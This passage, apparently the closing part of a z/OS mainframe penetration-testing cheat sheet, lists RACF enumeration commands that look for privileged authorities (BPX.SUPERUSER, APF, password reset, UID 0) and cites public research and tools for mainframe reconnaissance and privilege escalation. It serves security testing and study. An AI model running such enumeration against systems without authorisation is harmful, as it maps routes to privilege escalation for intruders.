SEARCH CLASS(TSOAUTH)
RLIST FACILITY BPX.SUPERUSER AUTH
RLIST FACILITY BPX.FILEATTR.APF AUTH
RLIST FACILITY IRR.PASSWORD.RESET AUTH
RLIST OPERCMDS MVS.SETPROG.** AUTH
RLIST TSOAUTH TESTAUTH AUTH
SEARCH CLASS(USER) UID(0)
```

---

## References (public research used for this sheet)

- Kaspersky Securelist — *Approach to mainframe penetration testing on z/OS* (recon, FTP/JES, privesc commands)
- Kaspersky Securelist — *Deconstructing RACF* (offline DB, SQL audit patterns, hashes)
- hacksomeheavymetal/zOS `pentesting.md` (console, PARMLIB, RACF checklist)
- mainframed/Enumeration (ENUM, APFCHECK, SEARCHRX, exfil)
- ayoul3/Privesc (ELV.APF patterns)
- Community Nmap mainframe NSE scripts (tn3270, tso-enum, vtam-enum, cics-*)
- IBM docs: LISTUSER, LISTDSD, RLIST, SEARCH, SETROPTS, APF, SURROGAT

See also: [[11-Resources-and-References]], [[05-Pentest-Methodology]], [[06-Privilege-Escalation-and-Misconfigs]].

---

**Prev:** [[11-Resources-and-References]] · **Next:** [[13-Console-CLI-Application-Security-Testing]] · **Index:** [[00-README]]
